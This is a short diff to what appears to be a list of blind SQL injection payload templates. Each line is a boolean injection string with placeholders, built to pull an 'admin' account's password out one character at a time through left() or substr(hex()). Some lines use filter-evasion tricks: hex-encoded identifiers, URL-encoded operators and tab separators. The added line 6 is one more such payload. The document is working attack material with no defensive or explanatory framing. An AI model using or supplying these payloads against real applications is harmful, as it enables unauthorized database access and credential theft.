@@ -4,3 +4,4 @@
 3.1 || 1 like 1 && id like 0x61646d696e && left({pw},{i}) like "{j}"-- -
 4.1||true && id in("admin") && left({pw},{i}) IN("{j}")-- -
 5.1||true%26%26id%09in("admin")%26%26left({pw},{i})%09IN("{j}")--%09-
+6.' or 1=1 and substr(hex({pw}), 1 , {i}) = '{j}
